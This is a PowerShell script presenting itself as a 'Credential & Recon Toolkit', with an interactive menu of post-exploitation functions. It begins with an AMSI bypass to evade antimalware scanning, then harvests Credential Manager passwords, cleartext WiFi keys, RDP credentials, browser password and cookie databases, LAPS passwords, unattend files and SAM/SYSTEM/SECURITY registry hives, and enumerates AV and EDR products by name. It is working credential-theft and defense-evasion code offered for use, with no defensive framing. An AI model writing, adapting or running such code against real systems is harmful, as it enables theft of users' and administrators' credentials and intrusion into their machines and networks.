$amsi = [Ref].Assembly.GetType(('System.Management.Automation.{0}' -f 'AmsiUtils'))
$field = $amsi.GetField(('amsi{0}Failed' -f 'Init'), 'NonPublic,Static')
$field.SetValue($null, $true)

$ErrorActionPreference = 'SilentlyContinue'

$outputDir = "$env:USERPROFILE\AppData\Local\Temp\diag_$(Get-Date -Format 'yyyyMMdd_HHmm')"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

function Test-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator
    )
}

function Write-Status {
    param([string]$msg, [string]$color = 'Gray')
    Write-Host "  $msg" -ForegroundColor $color
}

function Func-CredManager {
    try {
        [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType=WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault
        $all = $vault.RetrieveAll()
        $out = @()
        foreach ($c in $all) {
            try { $c.RetrievePassword() } catch { continue }
            if ($c.Password) {
                $out += [PSCustomObject]@{
                    Resource = $c.Resource
                    User     = $c.UserName
                    Password = $c.Password
                }
            }
        }
        if ($out.Count -gt 0) {
            $out | ConvertTo-Json -Depth 4 | Out-File "$outputDir\credman.json" -Encoding utf8
            Write-Status "Credential Manager: $($out.Count) entries saved" Green
        } else {
            Write-Status "Credential Manager: nothing found"
        }
    } catch {
        Write-Status "Credential Manager: failed ($_)"
    }
}

function Func-CmdKey {
    $raw = cmdkey /list 2>$null
    if (-not $raw) { Write-Status "cmdkey: no output"; return }

    $out = @()
    $cur = @{}
    foreach ($line in $raw) {
        if ($line -match '^\s*Target:\s*(.+)$') { $cur.Target = $Matches[1].Trim() }
        if ($line -match '^\s*Type:\s*(.+)$')   { $cur.Type   = $Matches[1].Trim() }
        if ($line -match '^\s*User:\s*(.+)$')   { $cur.User   = $Matches[1].Trim() }
        if ($line.Trim() -eq '' -and $cur.Count -gt 0 -and $cur.User) {
            $out += [PSCustomObject]$cur
            $cur = @{}
        }
    }
    if ($cur.Count -gt 0 -and $cur.User) { $out += [PSCustomObject]$cur }

    if ($out.Count -gt 0) {
        $out | ConvertTo-Json -Depth 4 | Out-File "$outputDir\cmdkey.json" -Encoding utf8
        Write-Status "cmdkey: $($out.Count) stored credentials found" Green
    } else {
        Write-Status "cmdkey: no stored credentials"
    }
}

function Func-WiFi {
    $profiles = netsh wlan show profiles 2>$null | Select-String ':\s*(.+)$'
    if (-not $profiles) { Write-Status "WiFi: no profiles found"; return }

    $out = @()
    foreach ($p in $profiles) {
        $name = $p.Matches.Groups[1].Value.Trim()
        $detail = netsh wlan show profile name="$name" key=clear 2>$null
        $keyLine = $detail | Select-String 'Key Content\s*:\s*(.+)$'
        $out += [PSCustomObject]@{
            Profile  = $name
            Password = if ($keyLine) { $keyLine.Matches.Groups[1].Value.Trim() } else { $null }
        }
    }
    if ($out.Count -gt 0) {
        $out | ConvertTo-Json -Depth 4 | Out-File "$outputDir\wifi.json" -Encoding utf8
        $withPass = ($out | Where-Object { $_.Password }).Count
        Write-Status "WiFi: $($out.Count) profiles, $withPass with passwords" Green
    }
}

function Func-RDP {
    $credPaths = @(
        "$env:APPDATA\Microsoft\Credentials",
        "$env:LOCALAPPDATA\Microsoft\Credentials",
        "$env:APPDATA\Microsoft\Protect",
        "$env:LOCALAPPDATA\Microsoft\Protect"
    )

    $blobs = $credPaths | ForEach-Object {
        Get-ChildItem -Path $_ -Recurse -File -ErrorAction SilentlyContinue
    } | Select-Object FullName, Length, LastWriteTime

    if ($blobs) {
        $blobs | ConvertTo-Json -Depth 4 | Out-File "$outputDir\rdp_credential_blobs.json" -Encoding utf8
        Write-Status "RDP: $($blobs.Count) credential blob(s) located" Green
    }

    $regPaths = @(
        'HKCU\Software\Microsoft\Terminal Server Client\Default',
        'HKCU\Software\Microsoft\Terminal Server Client\Servers'
    )
    $rdpHosts = @()
    foreach ($rp in $regPaths) {
        $q = reg query $rp /s 2>$null
        if ($q) {
            $rdpHosts += $q
        }
    }
    if ($rdpHosts) {
        $rdpHosts | Out-File "$outputDir\rdp_history.txt" -Encoding ascii
        Write-Status "RDP: saved connection history" Green
    }

    $mstsc = Get-ChildItem "$env:USERPROFILE\Documents" -Filter '*.rdp' -Recurse -ErrorAction SilentlyContinue
    if ($mstsc) {
        $mstsc | Copy-Item -Destination $outputDir -Force
        Write-Status "RDP: $($mstsc.Count) .rdp file(s) copied" Green
    }
}

function Func-Browsers {
    $profiles = @(
        @{ Name = 'chrome';  Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Name = 'edge';    Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Name = 'brave';   Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
        @{ Name = 'opera';   Path = "$env:APPDATA\Opera Software\Opera Stable" }
    )

    $targets = @('Login Data', 'Cookies', 'Local State', 'Web Data')

    foreach ($b in $profiles) {
        if (-not (Test-Path $b.Path)) { continue }
        $dest = "$outputDir\browser_$($b.Name)"
        New-Item -ItemType Directory -Path $dest -Force | Out-Null

        Get-ChildItem -Path $b.Path -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $targets -contains $_.Name } |
            ForEach-Object {
                $rel = $_.FullName.Substring($b.Path.Length).TrimStart('\')
                $out = Join-Path $dest $rel
                New-Item -ItemType Directory -Path (Split-Path $out) -Force | Out-Null
                Copy-Item $_.FullName $out -Force
            }
        Write-Status "Browsers: $($b.Name) files copied to $dest" Green
    }

    $ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $ffBase) {
        $ffProfiles = Get-ChildItem $ffBase -Directory
        foreach ($ffp in $ffProfiles) {
            $ffDest = "$outputDir\browser_firefox_$($ffp.Name)"
            New-Item -ItemType Directory -Path $ffDest -Force | Out-Null
            @('logins.json','key4.db','cookies.sqlite','signons.sqlite') | ForEach-Object {
                $src = Join-Path $ffp.FullName $_
                if (Test-Path $src) { Copy-Item $src $ffDest -Force }
            }
        }
        Write-Status "Browsers: Firefox profiles copied" Green
    }
}

function Func-Hives {
    if (-not (Test-Admin)) {
        Write-Status "Hive dump: requires admin — skipping" Yellow
        return
    }
    $hives = @{
        SAM      = "$outputDir\sam.hive"
        SYSTEM   = "$outputDir\system.hive"
        SECURITY = "$outputDir\security.hive"
    }
    foreach ($h in $hives.GetEnumerator()) {
        $result = reg save "HKLM\$($h.Key)" $h.Value /y 2>$null
        if (Test-Path $h.Value) {
            Write-Status "Hives: $($h.Key) saved" Green
        } else {
            Write-Status "Hives: $($h.Key) failed"
        }
    }
}

function Func-Dpapi {
    $paths = @(
        "$env:APPDATA\Microsoft\Protect",
        "$env:LOCALAPPDATA\Microsoft\Protect"
    )
    $keys = $paths | ForEach-Object {
        Get-ChildItem -Path $_ -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match '^[0-9a-fA-F\-]{36}$' }
    }
    if ($keys) {
        $keys | Select-Object FullName, Length, LastWriteTime |
            ConvertTo-Json -Depth 4 |
            Out-File "$outputDir\dpapi_masterkeys.json" -Encoding utf8
        Write-Status "DPAPI: $($keys.Count) master key(s) found" Green
    } else {
        Write-Status "DPAPI: no master keys found"
    }
}

function Func-Unattended {
    $searchPaths = @(
        'C:\',
        'C:\Windows\Panther',
        'C:\Windows\System32\sysprep',
        'C:\Windows\Setup\Scripts'
    )
    $hits = $searchPaths | ForEach-Object {
        Get-ChildItem -Path $_ -Recurse -ErrorAction SilentlyContinue -Include '*.xml','*.txt','*.ini' |
            Where-Object {
                $_.Length -lt 2MB -and
                $_.Length -gt 0 -and
                $_.Name -match 'unattend|sysprep|autounattend|setupcomplete'
            }
    }
    if ($hits) {
        foreach ($f in $hits) {
            Copy-Item $f.FullName "$outputDir\unattended_$($f.Name)" -Force
        }
        Write-Status "Unattended: $($hits.Count) file(s) found" Green
    } else {
        Write-Status "Unattended: nothing found"
    }
}

function Func-LAPS {
    if (-not (Test-Admin)) {
        Write-Status "LAPS: requires admin — skipping" Yellow
        return
    }
    try {
        $laps = Get-ADComputer $env:COMPUTERNAME -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' -ErrorAction Stop
        if ($laps.'ms-Mcs-AdmPwd') {
            $laps | Select-Object Name,'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' |
                ConvertTo-Json -Depth 3 |
                Out-File "$outputDir\laps.json" -Encoding utf8
            Write-Status "LAPS: password retrieved" Green
        } else {
            Write-Status "LAPS: attribute empty or not set"
        }
    } catch {
        Write-Status "LAPS: AD module unavailable or not domain joined"
    }
}

function Func-ScheduledTasks {
    $tasks = Get-ScheduledTask | Where-Object {
        $_.Principal.LogonType -eq 'Password' -or
        ($_.Principal.UserId -and $_.Principal.UserId -notmatch '^(SYSTEM|NT AUTHORITY|BUILTIN|S-1-5-18|S-1-5-19|S-1-5-20)$')
    }
    if ($tasks) {
        $tasks | Select-Object TaskName, TaskPath,
            @{N='User';     E={ $_.Principal.UserId }},
            @{N='LogonType';E={ $_.Principal.LogonType }},
            @{N='RunLevel'; E={ $_.Principal.RunLevel }} |
            ConvertTo-Json -Depth 4 |
            Out-File "$outputDir\scheduled_tasks.json" -Encoding utf8
        Write-Status "Scheduled tasks: $($tasks.Count) with stored credentials" Green
    } else {
        Write-Status "Scheduled tasks: none with stored credentials"
    }
}

function Func-SecurityPosture {
    $out = [ordered]@{}

    $av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
    $out['InstalledAV'] = $av | Select-Object displayName, productState, timestamp

    try {
        $pref = Get-MpPreference
        $stat = Get-MpComputerStatus
        $out['Defender'] = [ordered]@{
            Enabled              = $stat.AntivirusEnabled
            RealTimeProtection   = -not $pref.DisableRealtimeMonitoring
            BehaviorMonitoring   = -not $pref.DisableBehaviorMonitoring
            ScriptScanning       = -not $pref.DisableScriptScanning
            IOAVProtection       = -not $pref.DisableIOAVProtection
            NetworkProtection    = $pref.EnableNetworkProtection
            ControlledFolderAccess = $pref.EnableControlledFolderAccess -ne 0
            TamperProtection     = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtection -ErrorAction SilentlyContinue).TamperProtection
            LastQuickScan        = $stat.LastQuickScanTime
            LastFullScan         = $stat.LastFullScanTime
            SignatureVersion     = $stat.AntivirusSignatureVersion
            EngineVersion        = $stat.AMEngineVersion
        }
    } catch {
        $out['Defender'] = 'unavailable'
    }

    $edrNames = 'crowdstrike|csagent|falcon|sentinelone|s1agent|carbonblack|cbdefense|cortexXDR|cybereason|elastic|harfanglab|morphisec|cylance|fireeye|tanium|sophos|defender|msmpeng|sense'

    $out['EDRProcesses'] = Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $edrNames -or $_.Path -match $edrNames } |
        Select-Object Id, Name, Path, Company, StartTime

    $out['EDRServices'] = Get-Service -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $edrNames -or $_.DisplayName -match $edrNames } |
        Select-Object Name, DisplayName, Status, StartType

    $out['EDRDrivers'] = Get-WmiObject Win32_SystemDriver -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $edrNames -or $_.DisplayName -match $edrNames } |
        Select-Object Name, DisplayName, State, PathName

    $out['ASRRules'] = try {
        (Get-MpPreference).AttackSurfaceReductionRules_Ids | ForEach-Object {
            [PSCustomObject]@{ RuleId = $_; Action = 'enabled' }
        }
    } catch { $null }

    $out | ConvertTo-Json -Depth 6 | Out-File "$outputDir\security_posture.json" -Encoding utf8
    Write-Status "Security posture: saved to security_posture.json" Green

    Write-Host "`n  --- Quick Summary ---" -ForegroundColor Cyan
    if ($out['EDRProcesses']) {
        Write-Host "  EDR processes detected:" -ForegroundColor Yellow
        $out['EDRProcesses'] | ForEach-Object { Write-Host "    $($_.Name) (PID $($_.Id))" -ForegroundColor Yellow }
    } else {
        Write-Host "  No known EDR processes running" -ForegroundColor Green
    }
    if ($out['Defender'] -is [System.Collections.Specialized.OrderedDictionary]) {
        Write-Host "  Defender real-time: $($out['Defender'].RealTimeProtection)" -ForegroundColor $(if ($out['Defender'].RealTimeProtection) { 'Red' } else { 'Green' })
        Write-Host "  Tamper protection:  $($out['Defender'].TamperProtection)" -ForegroundColor $(if ($out['Defender'].TamperProtection -gt 0) { 'Red' } else { 'Green' })
    }
}

function Func-ServiceCreds {
    $svcs = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
        Where-Object {
            $_.StartName -and
            $_.StartName -notmatch '^(LocalSystem|NT AUTHORITY|LocalService|NetworkService)$'
        } |
        Select-Object Name, DisplayName, StartName, StartMode, State, PathName

    if ($svcs) {
        $svcs | ConvertTo-Json -Depth 4 | Out-File "$outputDir\services_custom_accounts.json" -Encoding utf8
        Write-Status "Services: $($svcs.Count) running under non-default accounts" Green
        $svcs | ForEach-Object { Write-Status "  $($_.Name) -> $($_.StartName)" Yellow }
    } else {
        Write-Status "Services: all running under default accounts"
    }
}

function Func-StickyKeys {
    $backdoors = @(
        @{ Path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe';     Name = 'sethc' },
        @{ Path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe';   Name = 'utilman' },
        @{ Path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe';       Name = 'osk' },
        @{ Path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe';  Name = 'narrator' }
    )
    $found = @()
    foreach ($b in $backdoors) {
        if (Test-Path $b.Path) {
            $val = Get-ItemProperty $b.Path -ErrorAction SilentlyContinue
            $found += [PSCustomObject]@{ Name = $b.Name; Debugger = $val.Debugger }
        }
    }
    if ($found) {
        $found | ConvertTo-Json | Out-File "$outputDir\accessibility_backdoors.json" -Encoding utf8
        Write-Status "Accessibility backdoors present:" Yellow
        $found | ForEach-Object { Write-Status "  $($_.Name) -> $($_.Debugger)" Yellow }
    } else {
        Write-Status "No accessibility key backdoors found"
    }
}

function Show-Menu {
    Clear-Host
    $adminTag = if (Test-Admin) { 'ADMIN' } else { 'USER' }
    Write-Host @"

  Credential & Recon Toolkit  [$adminTag @ $env:COMPUTERNAME]
  ─────────────────────────────────────────────────────
  Credentials
    1  Windows Credential Manager
    2  cmdkey stored credentials
    3  WiFi profiles + passwords
    4  RDP saved creds, history, .rdp files
    5  Browser password/cookie files
    6  LAPS password (domain)
    7  Unattended/sysprep files
    8  SAM / SYSTEM / SECURITY hives     [admin]
    9  DPAPI master key locations
   10  Scheduled tasks with stored creds
   11  Services running as non-default accounts

  Recon
   12  Security posture (AV/EDR/Defender/ASR)
   13  Accessibility key backdoors

    0  Exit
  ─────────────────────────────────────────────────────
  Output: $outputDir

"@ -ForegroundColor Cyan
    return (Read-Host "  Choice").Trim()
}

do {
    $choice = Show-Menu
    switch ($choice) {
        '1'  { Func-CredManager }
        '2'  { Func-CmdKey }
        '3'  { Func-WiFi }
        '4'  { Func-RDP }
        '5'  { Func-Browsers }
        '6'  { Func-LAPS }
        '7'  { Func-Unattended }
        '8'  { Func-Hives }
        '9'  { Func-Dpapi }
        '10' { Func-ScheduledTasks }
        '11' { Func-ServiceCreds }
        '12' { Func-SecurityPosture }
        '13' { Func-StickyKeys }
        '0'  { break }
        default { Write-Host "  invalid choice" -ForegroundColor Red }
    }
    if ($choice -ne '0') {
        Write-Host ""
        Write-Host "  Press any key to continue..." -ForegroundColor DarkGray
        $null = $host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
    }
} while ($choice -ne '0')

Write-Host "`n  Done. Output at: $outputDir`n" -ForegroundColor Green
